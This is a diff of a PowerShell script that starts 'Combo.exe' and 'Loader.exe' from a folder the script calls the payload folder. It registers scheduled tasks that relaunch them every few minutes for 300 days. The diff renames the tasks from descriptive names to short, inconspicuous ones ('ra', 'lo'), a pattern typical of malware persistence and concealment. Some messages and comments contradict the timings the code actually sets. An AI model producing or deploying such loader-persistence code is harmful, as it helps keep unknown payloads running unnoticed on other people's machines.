@@ -72,19 +72,19 @@ if (Test-Path $payloadFolderPath) {
     Write-Host "Payload folder found, executing processes..."
 
     # Check and start 'Original.exe' if not already running
-    $OriginalExePath = Join-Path $payloadFolderPath "Original.exe"
+    $OriginalExePath = Join-Path $payloadFolderPath "Combo.exe"
     if (Test-Path $OriginalExePath) {
-        $processRunning = Get-Process -Name "Original" -ErrorAction SilentlyContinue
+        $processRunning = Get-Process -Name "Combo" -ErrorAction SilentlyContinue
         if ($null -eq $processRunning) {
-            Write-Host "Starting Original.exe..."
+            Write-Host "Starting Combo.exe..."
             Start-Process -FilePath $OriginalExePath -WorkingDirectory $payloadFolderPath
             Write-Host "Waiting for 120 seconds before next step..."
             Start-Sleep -Seconds 5
         } else {
-            Write-Host "'Original.exe' is already running."
+            Write-Host "'Combo.exe' is already running."
         }
     } else {
-        Write-Host "'Original.exe' not found in the payload folder."
+        Write-Host "'Combo.exe' not found in the payload folder."
     }
 
     # Execute Loader.exe if present
@@ -115,7 +115,7 @@ if (Test-Path $payloadFolderPath) {
 }
 
 # I want to schedule a my Loader.exe
-$taskName = "RunOriginalEvery2Minutes"
+$taskName = "ra"
 $action = New-ScheduledTaskAction -Execute "$OriginalExePath"
 $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 50) -RepetitionDuration (New-TimeSpan -Days 300)
 $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -DontStopOnIdleEnd
@@ -123,7 +123,7 @@ Register-ScheduledTask -Action $action -Trigger $trigger -Settings $settings -Ta
 Write-Host "Scheduled task for Original.exe set up."
 
 # Schedule task for Loader.exe
-$taskNameLoader = "RunLoaderEvery5Minutes"
+$taskNameLoader = "lo"
 $actionLoader = New-ScheduledTaskAction -Execute "$LoaderPath"
 $triggerLoader = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 2) -RepetitionDuration (New-TimeSpan -Days 300)
 $settingsLoader = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -DontStopOnIdleEnd
